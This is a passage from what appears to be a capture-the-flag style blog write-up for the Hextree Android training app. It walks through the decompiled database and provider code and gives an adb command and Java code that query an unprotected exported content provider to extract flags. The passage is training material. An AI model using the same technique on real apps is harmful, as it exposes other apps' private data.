o=e[t].getBoundingClientRect().top+window.scrollY;if(o<=s&&n.has(e[t].id))return e[t].id}return e.find(e=>n.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=c(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(r,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function t(){const t=document.querySelector(s);if(!t)return;const c=!0,l=[...document.querySelectorAll(o)],d=[...t.querySelectorAll(i)];c&&t.querySelectorAll(a).forEach(e=>e.style.display="none");const r={toc:t,anchors:l,links:d,scrollOffset:n,collapseInactive:c};window.addEventListener("scroll",()=>e(r),{passive:!0}),window.addEventListener("hashchange",()=>e(r),{passive:!0}),e(r)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",t):t()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>Since we will interact with this database alot i thought why not take a look at it first so that we have a general idea if what we are up against:</p><h3 class="relative group">DB<div id=db class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#db aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>FlagDatabaseHelper</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>SQLiteOpenHelper</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>COLUMN_CONTENT</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;content&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>COLUMN_ID</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;_id&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>COLUMN_NAME</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;name&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>COLUMN_TITLE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;title&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>COLUMN_VALUE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;value&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>COLUMN_VISIBLE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;visible&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>CREATE_TABKE_NOTE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;CREATE TABLE Note (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, content TEXT NOT NULL );&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>CREATE_TABLE_FLAG</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;CREATE TABLE Flag (_id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, value TEXT NOT NULL, visible INTEGER NOT NULL DEFAULT 1);&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>DATABASE_NAME</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;flag.db&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>DATABASE_VERSION</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>TABLE_FLAG</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Flag&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>TABLE_NOTE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Note&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>FlagDatabaseHelper</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>DATABASE_NAME</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>SQLiteDatabase</span><span class=p>.</span><span class=na>CursorFactory</span><span class=p>)</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// android.database.sqlite.SQLiteOpenHelper</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>SQLiteDatabase</span><span class=w> </span><span class=n>sQLiteDatabase</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;FlagDatabaseHelper&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;database created&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=n>CREATE_TABLE_FLAG</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=n>CREATE_TABKE_NOTE</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=s>&#34;INSERT INTO Flag (name, value, visible) VALUES (&#39;flag30&#39;, &#39;HXT{censored}&#39;, 1);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=s>&#34;INSERT INTO Flag (name, value, visible) VALUES (&#39;flag31&#39;, &#39;HXT{censored}&#39;, 1);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=s>&#34;INSERT INTO Flag (name, value, visible) VALUES (&#39;flag32&#39;, &#39;HXT{censored}&#39;, 0);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=s>&#34;INSERT INTO Note (title, content) VALUES (&#39;secret&#39;, &#39;This is a secret note&#39;);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=s>&#34;INSERT INTO Note (title, content) VALUES (&#39;flag33&#39;, &#39;HXT{censored}&#39;);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// android.database.sqlite.SQLiteOpenHelper</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onUpgrade</span><span class=p>(</span><span class=n>SQLiteDatabase</span><span class=w> </span><span class=n>sQLiteDatabase</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>i2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sQLiteDatabase</span><span class=p>.</span><span class=na>execSQL</span><span class=p>(</span><span class=s>&#34;DROP TABLE IF EXISTS Flag&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>onCreate</span><span class=p>(</span><span class=n>sQLiteDatabase</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>from here we can see names an columns and how many table we have</p><h4 class="relative group"><strong>Database Structure</strong><div id=database-structure class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#database-structure aria-label=Anchor>#</a></span></h4><ol><li><strong>Database Name</strong>: <code>flag.db</code></li><li><strong>Tables</strong>:<ul><li><code>Flag</code> - Stores flag information</li><li><code>Note</code> - Stores notes (potentially containing additional flags)</li></ul></li></ol><h4 class="relative group"><strong>Flag Table Schema</strong><div id=flag-table-schema class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-table-schema aria-label=Anchor>#</a></span></h4><table><thead><tr><th>Column</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>_id</code></td><td>INTEGER (PK)</td><td>Auto-incrementing ID</td></tr><tr><td><code>name</code></td><td>TEXT</td><td>Flag name (e.g., <code>flag30</code>, <code>flag31</code>)</td></tr><tr><td><code>value</code></td><td>TEXT</td><td>Flag value (e.g., <code>HXT{censored}</code>)</td></tr><tr><td><code>visible</code></td><td>INTEGER</td><td>Visibility flag (<code>1</code> = visible, <code>0</code> = hidden)</td></tr></tbody></table><h4 class="relative group"><strong>Note Table Schema</strong><div id=note-table-schema class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#note-table-schema aria-label=Anchor>#</a></span></h4><table><thead><tr><th>Column</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>_id</code></td><td>INTEGER (PK)</td><td>Auto-incrementing ID</td></tr><tr><td><code>title</code></td><td>TEXT</td><td>Note title</td></tr><tr><td><code>content</code></td><td>TEXT</td><td>Note content</td></tr></tbody></table><h4 class="relative group"><strong>Preloaded Data</strong><div id=preloaded-data class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#preloaded-data aria-label=Anchor>#</a></span></h4><h5 class="relative group"><strong>Flag Table (Initial Entries)</strong><div id=flag-table-initial-entries class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-table-initial-entries aria-label=Anchor>#</a></span></h5><table><thead><tr><th><code>name</code></th><th><code>value</code></th><th><code>visible</code></th></tr></thead><tbody><tr><td><code>flag30</code></td><td><code>HXT{censored}</code></td><td><code>1</code> (visible)</td></tr><tr><td><code>flag31</code></td><td><code>HXT{censored}</code></td><td><code>1</code> (visible)</td></tr><tr><td><code>flag32</code></td><td><code>HXT{censored}</code></td><td><code>0</code> (hidden)</td></tr></tbody></table><h5 class="relative group"><strong>Note Table (Initial Entries)</strong><div id=note-table-initial-entries class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#note-table-initial-entries aria-label=Anchor>#</a></span></h5><table><thead><tr><th><code>title</code></th><th><code>content</code></th></tr></thead><tbody><tr><td><code>secret</code></td><td><code>This is a secret note</code></td></tr><tr><td><code>flag33</code></td><td><code>HXT{censored}</code></td></tr></tbody></table><p><em><strong>NOW onto getting our flags</strong></em></p><h3 class="relative group">Flag 30<div id=flag-30 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-30 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl> <span class=nt>&lt;provider</span>
</span></span><span class=line><span class=cl>    <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.providers.Flag30Provider&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:enabled=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:exported=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:authorities=</span><span class=s>&#34;io.hextree.flag30&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></div><p>since it&rsquo;s exported and their is no permission to protect it, we can call and interact with it as we want</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Flag30Provider</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>ContentProvider</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// alot of not implimentend methods so i removed them</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Cursor</span><span class=w> </span><span class=nf>query</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>strArr</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>strArr2</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>uri</span><span class=p>.</span><span class=na>getPath</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;/success&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Cursor</span><span class=w> </span><span class=n>query</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>dbHelper</span><span class=p>.</span><span class=na>getReadableDatabase</span><span class=p>().</span><span class=na>query</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		    </span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>TABLE_FLAG</span><span class=p>,</span><span class=w>  </span><span class=c1>// Table name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		    </span><span class=n>strArr</span><span class=p>,</span><span class=w>                         </span><span class=c1>// Columns to return (projection)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		    </span><span class=s>&#34;name=? AND visible=1&#34;</span><span class=p>,</span><span class=w>         </span><span class=c1>// WHERE clause (filter)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		    </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;flag30&#34;</span><span class=p>},</span><span class=w>         </span><span class=c1>// Selection args (replaces &#39;?&#39;)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		    </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=w>                </span><span class=c1>// GroupBy, Having, SortOrder</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>query</span><span class=p>.</span><span class=na>setNotificationUri</span><span class=p>(</span><span class=n>getContext</span><span class=p>().</span><span class=na>getContentResolver</span><span class=p>(),</span><span class=w> </span><span class=n>uri</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>success</span><span class=p>(</span><span class=n>logHelper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>query</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>When we pass an URI to be queried it checks if the path is <code>/success</code> and returns entries that has name <code>flag30</code> and is <code>visible=1</code> so the SQL query looks like</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=p>[</span><span class=n>strArr</span><span class=w> </span><span class=n>columns</span><span class=p>...]</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>flag_table</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;flag30&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=n>visible</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=p>[</span><span class=n>str2</span><span class=p>];</span><span class=w>
</span></span></span></code></pre></div><p>using the authority defined in xml the URI will be <code>content://io.hextree.flag30/success</code></p><h4 class="relative group">Solution<div id=solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution aria-label=Anchor>#</a></span></h4><p>In recent android versions to query a provider you need to define the app package that has the provider you want to query</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;queries&gt;</span>  
</span></span><span class=line><span class=cl>    <span class=nt>&lt;package</span> <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface&#34;</span> <span class=nt>/&gt;</span>  
</span></span><span class=line><span class=cl><span class=nt>&lt;/queries&gt;</span>
</span></span></code></pre></div><p>ADB:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl> adb shell content query --uri content://io.hextree.flag30/success
</span></span></code></pre></div><p>Output: <code>Row: 0 _id=1, name=flag30, value=HXT{XXXX-YYYYY-ZZZZ-c}, visible=1</code></p><p>java:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Uri</span><span class=p>.</span><span class=na>parse</span><span class=p>(</span><span class=s>&#34;content://io.hextree.flag30/success&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>query</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToFirst</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>sb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnCount</span><span class=p>();</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sb</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;, &#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnName</span><span class=p>(</span><span class=n>i</span><span class=p>)).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34; = &#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>i</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;evil&#34;</span><span class=p>,</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w> </span><span class=c1>// result will be logged </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToNext</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>This code asks another app (<code>io.hextree.flag30</code>) for hidden data and Reads all rows & columns from its database Then Logs the results.</p><h3 class="relative group">Flag 31<div id=flag-31 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-31 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-1 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;provider</span>
</span></span><span class=line><span class=cl>    <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.providers.Flag31Provider&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:enabled=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:exported=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:authorities=</span><span class=s>&#34;io.hextree.flag31&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Flag31Provider</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>ContentProvider</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>AUTHORITY</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;io.hextree.flag31&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>FLAGS</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>FLAG_ID</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>UriMatcher</span><span class=w> </span><span class=n>uriMatcher2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UriMatcher</span><span class=p>(</span><span class=o>-</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>uriMatcher</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uriMatcher2</span><span class=p>;</span><span class=w>
